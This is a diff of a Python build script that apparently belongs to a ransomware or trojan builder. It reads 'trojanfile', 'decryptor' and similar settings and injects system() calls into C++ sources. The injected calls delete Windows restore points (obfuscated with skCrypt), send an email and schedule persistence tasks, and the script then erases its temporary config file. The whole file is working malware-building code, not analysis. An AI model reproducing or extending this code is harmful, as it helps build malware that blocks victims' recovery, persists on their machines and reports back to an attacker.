@@ -1,10 +1,5 @@
 import os
 
-main_cppRead = open('main.cpp', 'r')
-lines = main_cppRead.readlines()
-content = ""
-inside = False
-
 for line_ in open('preCompilation.tmp', 'r').readlines():
     if line_.split('=')[0] == 'decryptor':
         decryptorText = line_.split('=')[1]
@@ -18,9 +13,21 @@ for line_ in open('preCompilation.tmp', 'r').readlines():
         customFileText = line_.split('=')[1]
     if line_.split('=')[0] == 'trojanfile':
         trojanFileText = line_.split('=')[1]
+    if line_.split('=')[0] == 'deleteRestPo':
+        deleteRestPoText = line_.split('=')[1]
+    if line_.split('=')[0] == 'sendEmail':
+        sendEmailText = line_.split('=')[1]
+    if line_.split('=')[0] == 'task1':
+        task1Text = line_.split('=')[1]
+    if line_.split('=')[0] == 'task2':
+        task2Text = line_.split('=')[1]
 
-for i in range(len(lines)):
-    line = lines[i]
+
+main_cppRead = open('main.cpp', 'r')
+content = ""
+inside = False
+
+for line in main_cppRead.readlines():
     if inside:
         if line == ';\n':
             inside = False
@@ -52,8 +59,70 @@ for i in range(len(lines)):
     content += line
 
 main_cppRead.close()
-os.remove('preCompilation.tmp')
 
 main_cppWrite = open('main.cpp', 'w')
 main_cppWrite.write(content)
 main_cppWrite.close()
+
+
+security_cppRead = open('security.cpp', 'r')
+content = ""
+next = False
+
+for line in security_cppRead.readlines():
+    if next:
+        content += f'\tsystem(skCrypt("{deleteRestPoText[:-1]}"));\n'
+        next = False
+        continue
+
+    if line == 'void DeleteRestorePoints() {\n':
+        next = True
+
+    content += line
+
+security_cppRead.close()
+
+security_cppWrite = open('security.cpp', 'w')
+security_cppWrite.write(content)
+security_cppWrite.close()
+
+
+sender_cppRead = open('sender.cpp', 'r')
+content = ""
+nextEmail = False
+nextSchedule1 = False
+nextSchedule2 = False
+
+for line in sender_cppRead.readlines():
+    if nextEmail:
+        content += f'\tsystem("{sendEmailText[:-1]}");\n'
+        nextEmail = False
+        continue
+
+    if nextSchedule1:
+        content += f'\tsystem("{task1Text[:-1]}");\n'
+        nextSchedule1 = False
+        nextSchedule2 = True
+        continue
+
+    if nextSchedule2:
+        content += f'\tsystem("{task2Text[:-1]}");\n'
+        nextSchedule2 = False
+        continue
+
+    if line == 'void SendEmail() {\n':
+        nextEmail = True
+    if line == 'void ScheduleTask() {\n':
+        nextSchedule1 = True
+
+    content += line
+
+sender_cppRead.close()
+
+sender_cppWrite = open('sender.cpp', 'w')
+sender_cppWrite.write(content)
+sender_cppWrite.close()
+
+
+
+os.remove('preCompilation.tmp')
